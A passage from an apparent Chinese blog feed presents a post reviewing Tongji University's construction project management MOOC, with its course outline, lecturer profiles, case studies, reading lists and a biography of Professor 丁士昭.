<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><ul>
<li>《项目复杂性识别、测度和管理研究》|罗岚、何清华</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:建筑工程项目管理</title>
    <url>/2019/03/27/Project-Construction/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>《工程项目管理》| 同济大学MOOC课程</li>
<li>理论：组织论、信息论、项目控制论</li>
<li>重点：投资控制、进度控制、质量控制、风险控制</li>
<li>技术：网络规划技术、项目管理软件（MS Project/P3/P6）、BIM</li>
<li>案例：上海地铁、上海虹桥交通枢纽、上海世博会、广州地铁、广州新白云机场</li>
</ul>
<span id="more"></span>
<p>按照维基百科的解释，工程学是指将知识（通常是科学，数学和经验）应用于结构，机器，材料，设备，系统，过程和组织的创新，设计，构造，操作和维护。</p>
<blockquote>
<p>Engineering is the application of knowledge, typically in the form of science, mathematics, and empirical evidence, to the innovation, design, construction, operation and maintenance of structures, machines, materials, devices, systems, processes, and organizations.</p>
</blockquote>
<p>常识告诉我们，无论是传统的建筑工程、交通工程，还是较为年轻的计算机工程、软件工程，大量的术语和管理思维其实源于建筑业 —— 也就是诸多从业人员口中常说的”搬砖“。</p>
<p>最近我有一个想法，即无论从事何种类别的工程职业——以”搬砖“活动谋生的从业人群都有必要了解一些土木工程知识，因为历史已经反复证明，古老建筑行业的叙事逻辑早早晚晚都要在所有新兴行业推广。</p>
<h2 id="《工程项目管理》-同济大学MOOC课程"><a href="#《工程项目管理》-同济大学MOOC课程" class="headerlink" title="《工程项目管理》| 同济大学MOOC课程"></a>《工程项目管理》| 同济大学MOOC课程</h2><p>《工程项目管理》MOOC课程是同济大学多年建设打造的一门国家精品课程。课程由我国工程管理界著名教授丁士昭先生主持（同济大学工程管理研究所创始人、名誉所长）。</p>
<blockquote>
<p>组织论是项目管理的母学科。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TongJi-CPM-%E4%B8%81%E5%A3%AB%E6%98%AD.png" alt=""></p>
<p>个人认为同济大学的《工程项目管理》本课程有 <strong>两大特色</strong>：</p>
<ul>
<li><p>第一，理论体系高度突出“组织理论（Organization Theory）”，可以说组织论与信息论是贯穿整个课程的两大基石。丁老师的观点是，学习项目管理之前很有必要先学习组织论。（《组织理论与设计》，Richard L. Daft著）</p>
</li>
<li><p>第二，高度突出信息论，强调项目管理的实质是知识管理、是面向专业人士的 Professional Management 。</p>
</li>
<li><p>第三，理论联系实际，讲师团队本身具有强大的工程实践背景，课件中援引了大量一线工程的实际素材。</p>
</li>
</ul>
<p>现代意义的建筑师出现在欧洲，最早的建筑师就是总营造师，也称建筑师傅。建筑师负责设计、购买材料、雇佣工匠，并管理工程施工。</p>
<p>16世纪至18世纪中期，欧洲兴起华丽的花型建筑热潮，在建筑师队伍中开始形成了分工，一部分建筑师联合起来专注于进行设计，另一部分建筑师则负责组织、监督施工，逐步开始了设计和施工的分离，并逐步形成了更加精细的专业分工。例如：</p>
<ul>
<li><p>营造师（Master Builder）：作为建筑项目的最高领导者，负责跟进整个工程项目。</p>
</li>
<li><p>建造师（Constructor）：负责全面的组织管理，以工程项目施工管理为主业，通常为项目经理或相关负责人。</p>
</li>
<li><p>建筑师（Architect）：负责设计建筑物平面图的专业人士。建筑师需要兼备艺术家的审美眼光和工程师的力学知识，作品需要从力学角度计算，选取合适的工程材料才能实现。</p>
</li>
</ul>
<p>即使是技术最成熟的建筑工程行业，组织和管理活动依然占据核心的位置，这个问题本身就已经很有意思。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TongJi-CPM-%E7%BB%84%E7%BB%87%E8%AE%BA.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TongJi-CPM-%E4%BF%A1%E6%81%AF%E6%B5%81.png" alt=""></p>
<h4 id="课程内容"><a href="#课程内容" class="headerlink" title="课程内容"></a>课程内容</h4><p>课程配套教材为《工程项目管理》，丁士昭主编，中国建筑工业出版社。</p>
<p>教学内容分别为基础理论知识模块、案例与实务模块及工程管理创新与前沿模块。</p>
<p><strong>基础理论知识</strong> 涵盖了工程管理的全面知识领域，包括工程项目管理概述、组织理论、目标控制基本原理、项目策划、投资控制、进度控制、工程项目质量控制和安全管理、工程项目管理信息化、设计阶段的项目管理、采购阶段的项目管理、施工阶段的项目管理、项目运营管理。</p>
<p><strong>案例与实务</strong> 构建了工程管理的案例库，包括The Domain of Project Management、How the 6th version of PMBOK GUILDE was born、重大基础设施建设项目策划——聚焦上海虹桥综合交通枢纽案例、上海虹桥综合交通枢纽工程进度总控、Virtual Design &amp; Construction - An Introduction、BIM技术与安全应急管理、2010年上海世博会工程建设项目管理、国际建筑业绩效管理的现状和实践、新时期施工管理的新问题、大型保障房项目建设管理创新与实践、基础设施项目群建设管理：长春市案例等。</p>
<p><strong>创新与实践</strong> 聚焦了工程管理的新视角，包括哲学视野中的工程、三峡工程项目管理、The Past, Present and Future of Project Management、升级中的中国对外承包业、关于中国建筑业改革发展的探讨、借鉴国际经验推进建设管理的全面深化改革、运用国际项目管理新理论7门精彩讲座，融合了工程院院士及国内外工程管理一线专家的真知灼见。</p>
<p>按照设计，完成所有MOOC课程10周时间。</p>
<p><a href="http://www.icourse163.org/learn/TONGJI-46008?tid=1003249011">http://www.icourse163.org/learn/TONGJI-46008?tid=1003249011</a></p>
<h4 id="授课讲师"><a href="#授课讲师" class="headerlink" title="授课讲师"></a>授课讲师</h4><div class="table-container">
<table>
<thead>
<tr>
<th>姓名</th>
<th>简介</th>
<th>主讲内容</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15208.html">丁士昭</a></td>
<td>同济大学工程管理研究所创始人、名誉所长。<br> 德国达姆斯塔特工业大学，工学博士</td>
<td>概论、组织理论、工程控制论、工程顾问、工程监理、政策法律</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15191.html">何清华</a></td>
<td>研究领域：建设工程项目管理、重大/复杂工程管理、精益建设</td>
<td>动态控制原理（目标控制、进度控制、质量控制）案例（）</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15216.html">乐云</a></td>
<td>研究领域：建设工程项目管理，包括项目前期策划、大型复杂工程项目组织管理、承发包模式与合同管理、工程管理信息化等</td>
<td>项目策划、案例（上海世博会工程进度总控）</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15211.html">张建国</a></td>
<td>研究领域主要有工程造价管理理论与方法、工程进度优化与控制、可持续建设、建筑服务贸易、IT在工程管理中应用等</td>
<td>工程项目投资控制、案例（上海虹桥综合交通枢纽交通中心工程、浦东国际机场扩建工程投资控制）</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15214.html">高欣</a></td>
<td>研究领域：城市管理与建设工程管理、项目管理、大型建设工程进度规划与控制、建设工程风险管理与保险</td>
<td>网络规划技术、案例（广州白云国际机场扩建工程总进度控制）</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15184.html">贾广社</a></td>
<td></td>
<td>案例（上海虹桥交通枢纽工程进度总控）</td>
</tr>
<tr>
<td><a href="http://sem.tongji.edu.cn/semch/15215.html">王广斌</a></td>
<td>研究领域：项目管理、工程管理信息化、项目投融资</td>
<td>案例（中德友好医院）</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><a href="http://sem.tongji.edu.cn/semch/15208.html">丁士昭</a> 。1940年9月26日出生于上海。1963年毕业于同济大学建筑工程系，同济大学工程管理研究所创始人、名誉所长。主要从事建筑经济、建设项目策划、项目管理等方面的研究。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15191.html">何清华</a>。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学复杂工程管理研究院副院长兼精益建设研究中心主任。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15216.html">乐云</a>。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学复杂工程管理研究院副院长。研究领域为建设工程项目管理，包括项目前期策划、大型复杂工程项目组织管理、承发包模式与合同管理、工程管理信息化等。（教育部2015年7月6日通报同济大学经济与管理学院建设管理与房地产系存在公款出国旅游问题，系主任乐云受到党内严重警告处分）</li>
<li><a href="http://sem.tongji.edu.cn/semch/15211.html">张建国</a>。管理学博士。同济大学经济与管理学院建设管理与房地产系教授、博士生导师。同济大学工程管理研究所所长。研究领域主要有工程造价管理理论与方法、工程进度优化与控制、可持续建设、建筑服务贸易、IT在工程管理中应用等。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15214.html">高欣</a>。同济大学经济与管理学院建设管理与房地产系教授，博士生导师。同济大学基建处长。研究领域：城市管理与建设工程管理、项目管理、大型建设工程进度规划与控制、建设工程风险管理与保险。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15184.html">贾广社</a>。同济大学经济与管理学院建设管理与房地产系教授。1982年，新疆工学院获工学学士学位 工民建专业，2000年，同济大学获管理学博士学位 工程管理专业。研究与领域工程项目管理、大型建设工程项目总控、项目管理成熟度，跨学科研究：建设工程社会学、工程哲学。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15215.html">王广斌</a>。同济大学经济与管理学院副院长。中国图学学会BIM委员会副主任委员、中国建设教育协会BIM委员会副主任委员、中国工程建设标准化协会建筑信息模型BIM专业委员会理事。</li>
<li><a href="http://sem.tongji.edu.cn/semch/15210.html">曹吉鸣</a>，博士、教授、博士生导师，同济大学复杂工程管理研究院副院长，设施管理研究中心主任。</li>
</ul>
<h4 id="1-1-工程项目管理概论（丁士昭）（推荐）"><a href="#1-1-工程项目管理概论（丁士昭）（推荐）" class="headerlink" title="1.1 工程项目管理概论（丁士昭）（推荐）"></a>1.1 工程项目管理概论（丁士昭）（推荐）</h4><ul>
<li>英语：<strong>Professional Management in Construction</strong> （1997年华盛顿会议）</li>
<li>美国：Construction Management</li>
<li>项目控制论，项目总控：Project Controlling</li>
</ul>
<h5 id="工程项目周期"><a href="#工程项目周期" class="headerlink" title="工程项目周期"></a>工程项目周期</h5><ul>
<li>项目策划，DM—Development Management</li>
<li>项目管理，PM—Project Management</li>
<li>营建管理，CM—Construction Management</li>
</ul>
<h4 id="1-2-项目管理的组织理论（丁士昭）（推荐）"><a href="#1-2-项目管理的组织理论（丁士昭）（推荐）" class="headerlink" title="1.2 项目管理的组织理论（丁士昭）（推荐）"></a>1.2 项目管理的组织理论（丁士昭）（推荐）</h4><blockquote>
<p>组织论是项目管理的母学科。</p>
</blockquote>
<ul>
<li>推荐阅读：《组织理论与设计》</li>
</ul>
<h4 id="1-3-The-Domain-of-Project-Management（Monique-Aubry）"><a href="#1-3-The-Domain-of-Project-Management（Monique-Aubry）" class="headerlink" title="1.3 The Domain of Project Management（Monique Aubry）"></a>1.3 The Domain of Project Management（Monique Aubry）</h4><h4 id="2-1-工程项目目标控制的基本原理（何清华）（推荐）"><a href="#2-1-工程项目目标控制的基本原理（何清华）（推荐）" class="headerlink" title="2.1 工程项目目标控制的基本原理（何清华）（推荐）"></a>2.1 工程项目目标控制的基本原理（何清华）（推荐）</h4><ul>
<li>动态控制原理在目标控制的应用</li>
<li>动态控制原理在投资控制的应用</li>
<li>动态控制原理在质量控制的应用</li>
</ul>
<h4 id="2-1-6-项目风险管理基本原理"><a href="#2-1-6-项目风险管理基本原理" class="headerlink" title="2.1.6 项目风险管理基本原理"></a>2.1.6 项目风险管理基本原理</h4><h4 id="2-1-7-工程项目风险管理"><a href="#2-1-7-工程项目风险管理" class="headerlink" title="2.1.7 工程项目风险管理"></a>2.1.7 工程项目风险管理</h4><ul>
<li>风险定性分析方法：P-I矩阵</li>
</ul>
<h4 id="2-2-项目策划（乐云）（推荐）"><a href="#2-2-项目策划（乐云）（推荐）" class="headerlink" title="2.2 项目策划（乐云）（推荐）"></a>2.2 项目策划（乐云）（推荐）</h4><ul>
<li>2.2.1 基本原理</li>
<li>2.2.2 环境调查与分析</li>
<li>2.2.3 项目定义与项目功能分析</li>
<li>2.2.4</li>
<li>2.2.5 项目实施策划</li>
<li>案例：上海世博会工程总进度计划（2007年11月）</li>
<li>2.2.6</li>
<li>2.2.7 项目实施的组织策划</li>
<li>组织结构策划</li>
<li>任务分工策划</li>
<li>管理职能分工策划</li>
<li><p>工作流程策划</p>
</li>
<li><p>2.2.8 项目实施的目标控制策划</p>
</li>
<li><p>进度目标控制策划</p>
</li>
<li>投资目标控制策划</li>
<li>质量目标控制策划</li>
</ul>
<h4 id="3-1-工程项目投资控制（张建国）（推荐）"><a href="#3-1-工程项目投资控制（张建国）（推荐）" class="headerlink" title="3.1 工程项目投资控制（张建国）（推荐）"></a>3.1 工程项目投资控制（张建国）（推荐）</h4><ul>
<li>3.1.5 谁对项目投资费用有影响</li>
</ul>
<h4 id="3-2-网络计划技术（高欣）（推荐）"><a href="#3-2-网络计划技术（高欣）（推荐）" class="headerlink" title="3.2 网络计划技术（高欣）（推荐）"></a>3.2 网络计划技术（高欣）（推荐）</h4><ul>
<li>工程项目进度计划的编制方法</li>
<li>工程项目进度计划系统</li>
<li>工程项目进度控制</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tool-%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E6%8A%80%E6%9C%AF.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
</ul>
<h4 id="3-2-9-工程项目进度管理案例"><a href="#3-2-9-工程项目进度管理案例" class="headerlink" title="3.2.9 工程项目进度管理案例"></a>3.2.9 工程项目进度管理案例</h4><ul>
<li>广州白云国际机场扩建工程总进度计划</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Theme_Arch_TianHe.png" alt=""></p>
<h4 id="3-3-案例教学-上海虹桥交通枢纽工程进度总控（贾广社）（推荐）"><a href="#3-3-案例教学-上海虹桥交通枢纽工程进度总控（贾广社）（推荐）" class="headerlink" title="3.3 案例教学|上海虹桥交通枢纽工程进度总控（贾广社）（推荐）"></a>3.3 案例教学|上海虹桥交通枢纽工程进度总控（贾广社）（推荐）</h4><ul>
<li>项目总控理论概述</li>
<li>进度总控实践</li>
<li>进度总控实践与创新</li>
</ul>
<h4 id="4-1-工程项目质量控制和安全管理（贾广社）"><a href="#4-1-工程项目质量控制和安全管理（贾广社）" class="headerlink" title="4.1 工程项目质量控制和安全管理（贾广社）"></a>4.1 工程项目质量控制和安全管理（贾广社）</h4><h4 id="4-2-计算机、网络平台和BIM在建设项目管理中的应用（王广斌）"><a href="#4-2-计算机、网络平台和BIM在建设项目管理中的应用（王广斌）" class="headerlink" title="4.2 计算机、网络平台和BIM在建设项目管理中的应用（王广斌）"></a>4.2 计算机、网络平台和BIM在建设项目管理中的应用（王广斌）</h4><ul>
<li>案例：中德友好医院</li>
</ul>
<h4 id="4-3-案例与实务-Virtual-Design-amp-Construction-An-Introduction（）"><a href="#4-3-案例与实务-Virtual-Design-amp-Construction-An-Introduction（）" class="headerlink" title="4.3 案例与实务| Virtual Design &amp; Construction - An Introduction（）"></a>4.3 案例与实务| Virtual Design &amp; Construction - An Introduction（）</h4><h4 id="5-1-工程设计阶段的项目管理（李永奎，副教授）"><a href="#5-1-工程设计阶段的项目管理（李永奎，副教授）" class="headerlink" title="5.1 工程设计阶段的项目管理（李永奎，副教授）"></a>5.1 工程设计阶段的项目管理（李永奎，副教授）</h4><ul>
<li>5.5.1 设计任务的委托和设计合同管理</li>
</ul>
<h4 id="5-2-工程项目的采购管理（孙继德，副教授）"><a href="#5-2-工程项目的采购管理（孙继德，副教授）" class="headerlink" title="5.2 工程项目的采购管理（孙继德，副教授）"></a>5.2 工程项目的采购管理（孙继德，副教授）</h4><h4 id="6-1-施工阶段的项目管理（曹吉鸣）"><a href="#6-1-施工阶段的项目管理（曹吉鸣）" class="headerlink" title="6.1 施工阶段的项目管理（曹吉鸣）"></a>6.1 施工阶段的项目管理（曹吉鸣）</h4><h4 id="6-2-建设项目的运营管理（曹吉鸣）"><a href="#6-2-建设项目的运营管理（曹吉鸣）" class="headerlink" title="6.2 建设项目的运营管理（曹吉鸣）"></a>6.2 建设项目的运营管理（曹吉鸣）</h4><h4 id="6-3-案例与实务-国际建筑业绩效管理的现状与实践（戴久坤）"><a href="#6-3-案例与实务-国际建筑业绩效管理的现状与实践（戴久坤）" class="headerlink" title="6.3 案例与实务|国际建筑业绩效管理的现状与实践（戴久坤）"></a>6.3 案例与实务|国际建筑业绩效管理的现状与实践（戴久坤）</h4><h4 id="6-4-关于建筑业改革发展的探讨（吴慧娟，住建部工程质量安全监管司）"><a href="#6-4-关于建筑业改革发展的探讨（吴慧娟，住建部工程质量安全监管司）" class="headerlink" title="6.4 关于建筑业改革发展的探讨（吴慧娟，住建部工程质量安全监管司）"></a>6.4 关于建筑业改革发展的探讨（吴慧娟，住建部工程质量安全监管司）</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/Theme_Arch_Megaproject_Xiancun.png" alt=""></p>
<h4 id="7-1-案例与实务-中国2010年上海世博会工程建设项目管理（乐云）（推荐）"><a href="#7-1-案例与实务-中国2010年上海世博会工程建设项目管理（乐云）（推荐）" class="headerlink" title="7.1 案例与实务|中国2010年上海世博会工程建设项目管理（乐云）（推荐）"></a>7.1 案例与实务|中国2010年上海世博会工程建设项目管理（乐云）（推荐）</h4><h4 id="7-2-新时期施工管理的新问题（施骞）（推荐）"><a href="#7-2-新时期施工管理的新问题（施骞）（推荐）" class="headerlink" title="7.2 新时期施工管理的新问题（施骞）（推荐）"></a>7.2 新时期施工管理的新问题（施骞）（推荐）</h4><ul>
<li>施工质量安全控制中的关键问题</li>
</ul>
<h4 id="8-1-案例教学-上海虹桥综合交通枢纽（刘武君，上海机场集团总工程师）"><a href="#8-1-案例教学-上海虹桥综合交通枢纽（刘武君，上海机场集团总工程师）" class="headerlink" title="8.1 案例教学|上海虹桥综合交通枢纽（刘武君，上海机场集团总工程师）"></a>8.1 案例教学|上海虹桥综合交通枢纽（刘武君，上海机场集团总工程师）</h4><ul>
<li>重大项目策划</li>
</ul>
<h4 id="8-2-案例教学-大型保障房项目建设管理（陈兴汉，南东栖霞建设集团总经理）"><a href="#8-2-案例教学-大型保障房项目建设管理（陈兴汉，南东栖霞建设集团总经理）" class="headerlink" title="8.2 案例教学|大型保障房项目建设管理（陈兴汉，南东栖霞建设集团总经理）"></a>8.2 案例教学|大型保障房项目建设管理（陈兴汉，南东栖霞建设集团总经理）</h4><h4 id="8-3-案例与实务-基础设施项目群建设管理：长春市案例（李永奎，副教授）"><a href="#8-3-案例与实务-基础设施项目群建设管理：长春市案例（李永奎，副教授）" class="headerlink" title="8.3 案例与实务|基础设施项目群建设管理：长春市案例（李永奎，副教授）"></a>8.3 案例与实务|基础设施项目群建设管理：长春市案例（李永奎，副教授）</h4><h4 id="9-1-哲学视野中的工程（殷瑞钰，原冶金部副部长）"><a href="#9-1-哲学视野中的工程（殷瑞钰，原冶金部副部长）" class="headerlink" title="9.1 哲学视野中的工程（殷瑞钰，原冶金部副部长）"></a>9.1 哲学视野中的工程（殷瑞钰，原冶金部副部长）</h4><h4 id="9-2-三峡工程项目管理（陆佑楣，原能源部副部长、三峡总公司总经理）"><a href="#9-2-三峡工程项目管理（陆佑楣，原能源部副部长、三峡总公司总经理）" class="headerlink" title="9.2 三峡工程项目管理（陆佑楣，原能源部副部长、三峡总公司总经理）"></a>9.2 三峡工程项目管理（陆佑楣，原能源部副部长、三峡总公司总经理）</h4><h4 id="10-1-工程管理创新与实践（丁士昭）"><a href="#10-1-工程管理创新与实践（丁士昭）" class="headerlink" title="10.1 工程管理创新与实践（丁士昭）"></a>10.1 工程管理创新与实践（丁士昭）</h4><h4 id="10-2-The-Past-Present-and-Future-of-Project-Management（Dr-Ediwin-J-Andrews）"><a href="#10-2-The-Past-Present-and-Future-of-Project-Management（Dr-Ediwin-J-Andrews）" class="headerlink" title="10.2 The Past,Present and Future of Project Management（Dr. Ediwin J. Andrews）"></a>10.2 The Past,Present and Future of Project Management（Dr. Ediwin J. Andrews）</h4><h4 id="10-3-升级中的中国对外承包业（吴之昕-中建一局总工）"><a href="#10-3-升级中的中国对外承包业（吴之昕-中建一局总工）" class="headerlink" title="10.3 升级中的中国对外承包业（吴之昕|中建一局总工）"></a>10.3 升级中的中国对外承包业（吴之昕|中建一局总工）</h4><h2 id="案例作业"><a href="#案例作业" class="headerlink" title="案例作业"></a>案例作业</h2><ul>
<li>美国国防部“北极星”项目</li>
<li>上海地铁一号线建设的组织策划（1990）；</li>
<li>上海虹桥交通枢纽（虹桥机场+高铁上海站）项目</li>
<li>广州地铁首期工程建设项目管理总体方案（1991.11—1992.5）；</li>
<li>广州新白云机场建设总进度计划纲要（2000.11—2001.2）</li>
</ul>
<h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><ul>
<li>《工程项目管理》，丁士昭主编，中国建筑工业出版社</li>
<li>《组织理论与设计(第10版)》，Richard L. Daft著</li>
<li>《项目管理 - 计划、进度和控制的系统方法》| 哈罗德·柯兹纳(Harold Kerzner)</li>
<li>《项目管理知识体系指南 (PMBOK Guide)》, 美国项目管理协会（PMI）</li>
<li>《建设工程项目管理（第三版）》，中国建筑工业出版社，2011</li>
<li>《工程项目前期策划》，乐云、李永奎，中国建筑工业出版社，2011</li>
<li>《工程施工组织与管理》，曹吉鸣，中国建筑工业出版社 ，2012</li>
<li>《建设工程项目管理成熟度理论及应用》，贾广社、陈建国，中国建筑工业出版社，2012</li>
<li>《工程项目管理》，乐云、邓铁军，武汉理工大学出版社，2008</li>
<li>《项目管理》，何清华，同济大学出版社,2011</li>
<li>《工程管理概论（第二版）》，成虎，中国建筑工业出版社，2011</li>
<li>《建设工程管理概论》，任宏，武汉理工大学出版社，2008</li>
<li>《工程计量与造价管理(第三版)》，陈建国、高显义，同济大学出版社，2010</li>
<li>《工程计价与造价管理》，陈建国、高显义，中国建筑工业出版社，2011</li>
<li>《项目总控—建设工程的新型管理模式》，贾广社，同济大学出版社，2003</li>
<li>《成功的项目管理（第5版）》，（美）克莱门斯、（美）吉多著，张金成、杨坤译，电子工业出版社，2012</li>
</ul>
<h4 id="MOOC资源"><a href="#MOOC资源" class="headerlink" title="MOOC资源"></a>MOOC资源</h4><ul>
<li><a href="http://www.icourse163.org/learn/TONGJI-46008?tid=1003249011">《工程项目管理》| 同济大学 MOOC 课程</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Theme_Arch_TongJi.png" alt=""></p>
<h2 id="学习小组"><a href="#学习小组" class="headerlink" title="学习小组"></a>学习小组</h2><p>​<br>​感兴趣的朋友可以加入知识星球共同学习，链接 <a href="https://t.zsxq.com/qvnYNbE">https://t.zsxq.com/qvnYNbE</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83_%E5%B7%A5%E7%A8%8B%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86.png" alt=""></p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="翻译卡片"><a href="#翻译卡片" class="headerlink" title="翻译卡片"></a>翻译卡片</h4><p>建筑工程（简称：AE、BE、CE，英语：Architectural engineering、Building Engineering、Construction Engineering），原称为土木工程，是一个关于建筑物的施工和内部设施安装的工程学。</p>
<h4 id="人物卡片：丁士昭"><a href="#人物卡片：丁士昭" class="headerlink" title="人物卡片：丁士昭"></a>人物卡片：丁士昭</h4><h5 id="丁士昭履历"><a href="#丁士昭履历" class="headerlink" title="丁士昭履历"></a>丁士昭履历</h5><p>1952—1955，上海，南洋模范中学，初中<br>1955—1958，上海，上海中学，高中<br>1958—1963，上海，同济大学 建筑工程系，建筑工程经济与组织专业<br>1963—1978，同济大学 建筑施工组织教研室，助教<br>1978—1985，同济大学 建筑管理教研室，讲师<br>1980.10—1982.10，联邦德国，达姆斯塔特技术大学（Technische Universitaet Darmstadt），科研、进修。<br>1983—1985，同济大学 建筑管理教研室，主任<br>1985.4—1985.12，联邦德国，达姆斯塔特技术大学，土木工程系，工学博士（1985.10）。博士论文—多阶网络法的数学模型、解法和程序。<br>1986—1987，同济大学 经济信息系，副教授<br>1987年—经济信息系 教授、副系主任、经济管理学院副院长<br>1988.10—1989.2, 联邦德国，Integrata 软件公司，科研、进修<br>1991—至今，同济大学 工程管理研究所所长，教授<br>1998.7—1999.1， 日本 名古屋大学客座教授<br>2000.8—2000.10, 联邦德国，Integrata 基金会</p>
<h5 id="主要讲授课程"><a href="#主要讲授课程" class="headerlink" title="主要讲授课程"></a>主要讲授课程</h5><ul>
<li>项目管理</li>
<li>建设监理</li>
<li>建筑经济</li>
<li>算法语言</li>
<li>网络计划技术</li>
<li>建筑施工组织与计划</li>
<li>专业德语</li>
</ul>
<h5 id="科研成果"><a href="#科研成果" class="headerlink" title="科研成果"></a>科研成果</h5><ul>
<li>主持研制和开发“上海地铁工程项目管理信息系统”，上海市科委组织鉴定，鉴定结论：国内首创，1991年10月</li>
<li>主持编写“广州地铁首期工程项目管理总体方案”，建设部组织鉴定，1992年1月</li>
<li>主持研究“建设项目总承包的理论、方法与手段”，上海市建委组织鉴定，鉴定结论：国内领先，1992年，（该课题由同济大学工程管理研究所、上海华东建筑设计院、中建总公司上海分公司联合研究）</li>
<li>主持研制和开发“上海合流污水处理投资控制信息系统“,上海合流污水处理工程指挥部委托， 1993年</li>
<li>主持研究“中国建设监理模式”，上海市建委组织鉴定、建设部参加鉴定，建设部七五重点项目，鉴定结论：国内领先水平。1995年6月，（该课题由10余人参加，编写科研报告27份）</li>
<li>主持研制和开发“DP-1/CC计算机辅助投资控制系统”，建设部组织鉴定，鉴定结论：国际先进水平，1996年11月，（该课题由同济大学工程管理研究所 与Infoage软件公司联合开发）</li>
<li>主持研究“德国建设管理体制及相关制度的研究”，建设部委托,1998年</li>
<li>主持研究“国际建筑业管理体制、法制与机制的研究”，建设部组织鉴定，中国高校科学技术进步奖，二等奖，2000年</li>
<li>主持研制和开发“长江口深水航道治理工程信息系统”，长江口深水航道治理工程公司委托,1998-2000年</li>
<li>主持研制和开发“天津基础设施综合管理信息系统（TIIMIS）”，天津市建委委托，世界银行贷款项目,1998-2000年</li>
</ul>
<h4 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
